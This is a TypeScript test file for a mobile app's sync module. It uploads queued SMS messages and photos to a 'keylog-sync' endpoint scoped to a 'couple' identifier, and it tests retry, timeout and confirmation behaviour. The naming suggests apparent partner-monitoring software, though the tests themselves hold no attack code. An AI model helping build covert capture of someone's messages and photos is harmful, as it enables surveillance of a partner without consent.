// features/capture/sync.test.ts — pure-logic tests for draining the capture
// queue to Supabase: photo upload + edge POST + confirm/clear lifecycle, plus
// the idempotency contract (a failed upload/batch leaves rows queued for retry).
//
// Mocks (per-file, via vi.mock):
//   • ./queue          — fake pendingCapture/removeCaptured (no sqlite)
//   • ../../lib/db/client — fake supabase: auth.getSession + storage.upload
//   • expo-file-system     — fake File (local photo bytes; fetch can't read file://)
//   • global.fetch     — programmable, used for the edge POST only
import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { CaptureItem } from './queue';

const uploadedPaths: { path: string; contentType?: string; upsert?: boolean }[] = [];

// vi.hoisted: the vi.mock factories below are hoisted above every declaration,
// so the spies/data they reference must be created with vi.hoisted (not bare
// const, which would still be in the temporal dead zone at factory time).
const { getSession, storageUpload, pendingListH, removedH } = vi.hoisted(() => ({
  getSession: vi.fn<() => Promise<{ data: { session: { access_token: string } | null } }>>(),
  storageUpload: vi.fn<(
    path: string,
    body: unknown,
    options?: { contentType?: string; upsert?: boolean },
  ) => Promise<{ error: { message: string } | null }>>(),
  pendingListH: [] as CaptureItem[],
  removedH: [] as { kind: string; device_key: string }[][],
}));

vi.mock('../../lib/db/client', () => ({
  supabase: {
    auth: { getSession },
    storage: {
      from: () => ({ upload: storageUpload }),
    },
  },
  // Mirror what the real helper does for a VALID (never-expired) fake token:
  // resolve the same session the test's getSession mock produces. A null
  // session here means "not authenticated" → sync stays queued.
  getValidSession: vi.fn(async () => {
    const { data } = await getSession();
    return data.session ? { session: data.session } : null;
  }),
}));

vi.mock('./queue', () => ({
  pendingCapture: vi.fn(async () => pendingListH),
  removeCaptured: vi.fn(async (entries: { kind: string; device_key: string }[]) => { removedH.push(entries); }),
  enqueueCapture: vi.fn(async () => {}),
  getCaptureCursor: vi.fn(async () => null),
  setCaptureCursor: vi.fn(async () => {}),
  countCapturePending: vi.fn(async () => 0),
}));

const fetchMock = vi.fn();
vi.stubGlobal('fetch', fetchMock);

// Local photo bytes are now read via expo-file-system's File (fetch cannot
// resolve file:// URIs). Stub it so `new File(file://...).arrayBuffer()` yields
// bytes without touching the native FS in the test env.
vi.mock('expo-file-system', () => ({
  File: class {
    uri: string;
    constructor(...uris: (string | { uri: string })[]) {
      this.uri = uris.map((u) => (typeof u === 'string' ? u : u.uri)).join('');
    }
    async arrayBuffer() {
      // A read failure for the "slow" fixture simulates the timeout/failure
      // path (e.g. an unreadable local file): it must skip, not confirm.
      if (this.uri.includes('slow')) throw new DOMException('aborted', 'AbortError');
      // A read that NEVER settles (e.g. a wedged local file) must still be
      // bounded by UPLOAD_TIMEOUT_MS so syncCapture cannot hang the whole drain.
      // The test drives this with fake timers; "hang" resolves only on stop.
      if (this.uri.includes('hang')) return new Promise<ArrayBuffer>(() => {});
      return new ArrayBuffer(8);
    }
  },
}));

import { syncCapture, isPhotoItem } from './sync';
import { removeCaptured } from './queue';

beforeEach(() => {
  pendingListH.length = 0;
  removedH.length = 0;
  uploadedPaths.length = 0;
  fetchMock.mockReset();
  getSession.mockClear();
  storageUpload.mockClear();
  (removeCaptured as unknown as { mockClear: () => void }).mockClear();
  storageUpload.mockResolvedValue({ error: null });
  getSession.mockResolvedValue({ data: { session: { access_token: 'test-token' } } });
});

function smsItem(id: string): CaptureItem {
  return {
    device_key: id,
    kind: 'sms',
    storage_path: null,
    payload: { address: '+1', body: 'hi', date: 1, direction: 'inbox' },
    created_at: '2026-01-01T00:00:00.000Z',
  };
}

function photoItem(id: string, uri = `file:///p/${id}.jpg`): CaptureItem {
  return {
    device_key: id,
    kind: 'photo',
    storage_path: `couple-1/${id}.jpg`,
    payload: { uri, creationTime: 100 },
    created_at: '2026-01-01T00:00:00.000Z',
  };
}

describe('syncCapture — no-op paths', () => {
  it('returns zeroes when the queue is empty', async () => {
    const res = await syncCapture('couple-1');
    expect(res).toEqual({ attempted: 0, uploaded: 0, accepted: 0, failed: 0 });
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('leaves everything unconfirmed when there is no auth session', async () => {
    getSession.mockResolvedValueOnce({ data: { session: null } });
    pendingListH.push(smsItem('1'), smsItem('2'));
    const res = await syncCapture('couple-1');
    expect(res.accepted).toBe(0);
    expect(res.failed).toBe(2); // offline/auth-missing → failed (retried later)
    expect(fetchMock).not.toHaveBeenCalled();
    expect(removeCaptured).not.toHaveBeenCalled();
  });
});

describe('syncCapture — happy path', () => {
  it('uploads the photo bytes, POSTs metadata, and confirms only on full success', async () => {
    pendingListH.push(photoItem('p1', 'file:///p/p1.jpg'), smsItem('s1'));

    // The only fetch is the edge function POST (2xx accepting all rows) — the
    // photo bytes come from the expo-file-system File mock, not fetch.
    fetchMock.mockResolvedValueOnce({ ok: true, status: 200, json: async () => ({ droppedRows: [] }) });

    const res = await syncCapture('couple-1');
    expect(res.attempted).toBe(2);
    expect(res.uploaded).toBe(1);
    expect(res.accepted).toBe(2);
    expect(res.failed).toBe(0);

    // the photo's local bytes were read and uploaded to the storage bucket
    expect(storageUpload).toHaveBeenCalledTimes(1);
    expect(storageUpload.mock.calls[0]![0]).toBe('couple-1/p1.jpg');
    expect(storageUpload.mock.calls[0]![2]).toMatchObject({ contentType: 'image/jpeg', upsert: true });

    // the edge function got a type:'media' batch with both rows, Bearer authed
    const postCall = fetchMock.mock.calls.find((c) => String(c[0]).includes('/functions/v1/keylog-sync'));
    expect(postCall).toBeTruthy();
    const [url, init] = postCall as [string, { headers: Record<string, string>; body: string }];
    expect(url).toContain('/functions/v1/keylog-sync');
    expect(init.headers.authorization).toBe('Bearer test-token');
    const body = JSON.parse(init.body);
    expect(body.type).toBe('media');
    expect(body.v).toBe(1);
    expect(body.rows).toHaveLength(2);
    expect(body.rows.find((r: { kind: string }) => r.kind === 'sms')!.payload).toBeTruthy();

    // confirmed (kind, device_key)s were cleared from the queue
    expect(removeCaptured).toHaveBeenCalledTimes(1);
    expect(removedH[0]!.sort((a, b) => `${a.kind}:${a.device_key}`.localeCompare(`${b.kind}:${b.device_key}`)))
      .toEqual([
        { kind: 'photo', device_key: 'p1' },
        { kind: 'sms', device_key: 's1' },
      ]);
  });

  it('uploads a photo carrying a mimeType with that exact content type', async () => {
    pendingListH.push({
      device_key: 'p2',
      kind: 'photo',
      storage_path: `couple-1/p2.jpg`,
      payload: { uri: 'file:///p/p2.jpg', creationTime: 100, filename: 'p2.jpg', mimeType: 'image/png', width: 100, height: 100 },
      created_at: '2026-01-01T00:00:00.000Z',
    });
    fetchMock.mockResolvedValueOnce({ ok: true, status: 200, json: async () => ({ droppedRows: [] }) });

    const res = await syncCapture('couple-1');
    expect(res.uploaded).toBe(1);
    expect(res.accepted).toBe(1);
    expect(res.failed).toBe(0);

    expect(storageUpload).toHaveBeenCalledTimes(1);
    expect(storageUpload.mock.calls[0]![0]).toBe('couple-1/p2.jpg');
    expect(storageUpload.mock.calls[0]![2]).toMatchObject({ contentType: 'image/png', upsert: true });
  });

  it('does not confirm a photo whose upload failed — it stays for retry', async () => {
    pendingListH.push(photoItem('p1'));
    storageUpload.mockResolvedValueOnce({ error: { message: 'quota' } });
    // photo upload fails → the batch is empty → no edge POST fetch at all
    // (photo bytes come from the File mock; only the storage upload is at fault)

    const res = await syncCapture('couple-1');
    expect(res.uploaded).toBe(0);
    expect(res.failed).toBe(1); // dropped from batch, not confirmed
    expect(res.accepted).toBe(0);
    expect(removeCaptured).not.toHaveBeenCalled();
  });

  it('keeps rows queued when the edge function returns non-2xx', async () => {
    pendingListH.push(smsItem('s1'));
    fetchMock.mockResolvedValueOnce({ ok: false, status: 500 });
    const res = await syncCapture('couple-1');
    expect(res.failed).toBe(1);
    expect(res.accepted).toBe(0);
    expect(removeCaptured).not.toHaveBeenCalled();
  });

  it('never throws on a network failure during the edge POST', async () => {
    pendingListH.push(smsItem('s1'));
    fetchMock.mockRejectedValueOnce(new Error('offline'));
    const res = await syncCapture('couple-1');
    expect(res.failed).toBe(1);
    expect(res.accepted).toBe(0);
  });

  it('does not confirm rows the edge reported in body.droppedRows', async () => {
    pendingListH.push(smsItem('keep'), smsItem('drop'));
    // the dropped key = 'drop'; 'keep' is accepted → only 'keep' confirmed
    fetchMock.mockResolvedValueOnce({
      ok: true,
      status: 200,
      json: async () => ({ droppedRows: [{ kind: 'sms', deviceKey: 'drop' }] }),
    });
    const res = await syncCapture('couple-1');
    expect(res.accepted).toBe(1);
    expect(res.failed).toBe(1); // the dropped row stays queued
    expect(removeCaptured).toHaveBeenCalledTimes(1);
    expect(removedH[0]).toEqual([{ kind: 'sms', device_key: 'keep' }]);
  });

  it('confirms nothing when the success body cannot be parsed (safe side)', async () => {
    pendingListH.push(smsItem('s1'));
    // 200 but a non-JSON / broken body → parse fails → nothing confirmed
    fetchMock.mockResolvedValueOnce({ ok: true, status: 200, json: async () => { throw new Error('bad json'); } });
    const res = await syncCapture('couple-1');
    expect(res.accepted).toBe(0);
    expect(res.failed).toBe(1); // stays queued — not deleted
    expect(removeCaptured).not.toHaveBeenCalled();
  });

  it('survives a photo byte read that fails (skips, not confirmed)', async () => {
    pendingListH.push(photoItem('slow', 'file:///slow/p.jpg'));
    // The local byte read (expo-file-system File) throws for the "slow" fixture
    // (File mock rejects) → upload skipped, not confirmed, so it is retried later.
    const res = await syncCapture('couple-1');
    expect(res.uploaded).toBe(0);
    expect(res.failed).toBe(1); // not confirmed → retried later
    expect(res.accepted).toBe(0);
    expect(removeCaptured).not.toHaveBeenCalled();
  });

  it('bounds a hung local photo read by the timeout so it cannot wedge the drain', async () => {
    vi.useFakeTimers();
    try {
      pendingListH.push(photoItem('hang2', 'file:///hang/p.jpg'));
      // A read that NEVER settles must still be aborted by UPLOAD_TIMEOUT_MS so a
      // wedged local file cannot stall the whole serial drain (which would block
      // SMS/browser rows behind it). We advance fake time past the 20s timeout;
      // the drain must then finish with the photo skipped, not confirmed.
      const runPromise = syncCapture('couple-1');
      await vi.advanceTimersByTimeAsync(20_001);
      const res = await runPromise;
      expect(res.uploaded).toBe(0);
      expect(res.failed).toBe(1); // not confirmed → retried later
      expect(res.accepted).toBe(0);
      expect(removeCaptured).not.toHaveBeenCalled();
      expect(storageUpload).not.toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });
});

describe('isPhotoItem', () => {
  it('narrows to storage-bearing photo items', () => {
    expect(isPhotoItem({ device_key: 'p', kind: 'photo', storage_path: 'device/x/p.jpg', payload: {}, created_at: 'x' })).toBe(true);
    expect(isPhotoItem(smsItem('s'))).toBe(false);
  });
});
